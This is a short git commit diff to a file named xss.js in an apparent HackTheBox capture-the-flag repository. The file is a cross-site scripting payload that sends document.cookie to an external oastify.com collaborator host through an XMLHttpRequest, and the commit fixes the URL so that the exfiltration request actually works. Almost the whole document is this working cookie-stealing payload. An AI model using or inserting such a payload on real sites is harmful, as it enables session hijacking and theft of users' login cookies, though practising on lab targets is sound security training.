ab3884602360c5badb8e64c1f66103411d3a1edc
AlexDowneyJr <42532723+AlexDowneyJr@users.noreply.github.com>
2022-10-29 22:00:00 +0400

    Update xss.js

--- HackTheBox/xss.js
+++ HackTheBox/xss.js
@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'vtsgmbe80421hbkrwsxs46uxlorjf8.oastify.com/?' + document.cookie, true);
+xhttp.open('GET', 'http://vtsgmbe80421hbkrwsxs46uxlorjf8.oastify.com/?' + document.cookie, true);
 xhttp.send();
